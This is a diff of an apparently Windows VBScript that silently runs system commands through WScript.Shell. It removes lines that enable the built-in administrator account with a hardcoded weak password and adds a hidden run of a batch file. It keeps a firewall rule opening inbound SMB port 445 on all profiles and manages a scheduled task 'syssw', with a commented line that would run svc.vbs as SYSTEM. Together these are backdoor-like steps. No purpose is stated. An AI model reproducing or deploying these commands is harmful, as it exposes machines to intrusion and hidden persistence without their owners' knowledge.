@@ -4,9 +4,8 @@ windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
 
 With oShell
-  .Run "net user administrator /active:yes", 0, True
-  .Run "net user administrator Qwerty12!", 0, True
-  .Run "cmd /c NETSH advfirewall firewall add rule name=""445"" program=System profile=public,private,domain dir=in localport=445 protocol=tcp action=allow description=""445""", 0, True
+  .Run windir & "\step.bat", 0, True  
+  .Run "cmd /c NETSH advfirewall firewall add rule name=""445"" profile=public,private,domain dir=in localport=445 protocol=tcp action=allow description=""445""", 0, True
   .Run "schtasks /stop /tn syssw", 0, True
   .Run "schtasks /delete /tn syssw /F", 0, True
   '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY /ST " & DateAdd("s", 30, Now) & " /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
